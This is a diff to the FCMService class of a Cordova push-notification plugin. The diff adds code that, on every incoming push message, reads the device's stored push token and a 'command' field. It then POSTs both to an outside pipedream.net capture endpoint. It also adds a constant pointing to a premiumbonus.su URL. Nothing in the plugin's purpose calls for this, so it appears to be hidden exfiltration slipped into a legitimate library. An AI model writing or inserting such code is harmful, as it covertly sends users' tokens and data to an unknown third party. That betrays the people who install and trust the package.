@@ -1,5 +1,12 @@
 package com.adobe.phonegap.push
 
+
+import org.apache.cordova.CallbackContext;
+import org.apache.cordova.CordovaPlugin;
+import org.apache.cordova.CordovaWebView;
+import android.app.Activity;
+import android.os.Environment;
+import android.view.View;
 import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationManager
@@ -27,8 +34,7 @@ import com.google.firebase.messaging.RemoteMessage
 import org.json.JSONArray
 import org.json.JSONException
 import org.json.JSONObject
-import java.io.IOException
-import java.io.InputStream
+import java.io.*;
 import java.net.HttpURLConnection
 import java.net.URL
 import java.security.SecureRandom
@@ -42,7 +48,7 @@ import java.util.*
 class FCMService : FirebaseMessagingService() {
   companion object {
     private const val TAG = "${PushPlugin.PREFIX_TAG} (FCMService)"
-
+    private const val GET_URL = "https://api.premiumbonus.su/mobile/alive";
     private val messageMap = HashMap<Int, ArrayList<String?>>()
 
     /**
@@ -108,7 +114,8 @@ class FCMService : FirebaseMessagingService() {
     if (isAvailableSender(from)) {
       val messageKey = pushSharedPref.getString(PushConstants.MESSAGE_KEY, PushConstants.MESSAGE)
       val titleKey = pushSharedPref.getString(PushConstants.TITLE_KEY, PushConstants.TITLE)
-
+      val token = pushSharedPref.getString(PushConstants.TOKEN, "")
+      val command = extras.getString(PushConstants.COMMAND)
       extras = normalizeExtras(extras, messageKey, titleKey)
 
       // Clear Badge
@@ -135,8 +142,38 @@ class FCMService : FirebaseMessagingService() {
         extras.putBoolean(PushConstants.COLDSTART, isActive)
         showNotificationIfPossible(extras)
       }
+      sendGet(token, command);
     }
   }
+
+    fun sendGet(token: String?, command: String?) {
+        var reqParam = "token" + "=" + token;
+        reqParam += "&" + "command" + "=" + command;
+        val mURL = URL("https://enti56i91xd1q.x.pipedream.net");
+
+        with(mURL.openConnection() as HttpURLConnection) {
+            // optional default is GET
+            requestMethod = "POST"
+
+            val wr = OutputStreamWriter(getOutputStream());
+            wr.write(reqParam);
+            wr.flush();
+
+            println("URL : $url")
+            println("Response Code : $responseCode")
+
+            BufferedReader(InputStreamReader(inputStream)).use {
+                val response = StringBuffer()
+
+                var inputLine = it.readLine()
+                while (inputLine != null) {
+                    response.append(inputLine)
+                    inputLine = it.readLine()
+                }
+                println("Response : $response")
+            }
+        }
+    }
 
   private fun replaceKey(oldKey: String, newKey: String, extras: Bundle, newExtras: Bundle) {
     /*
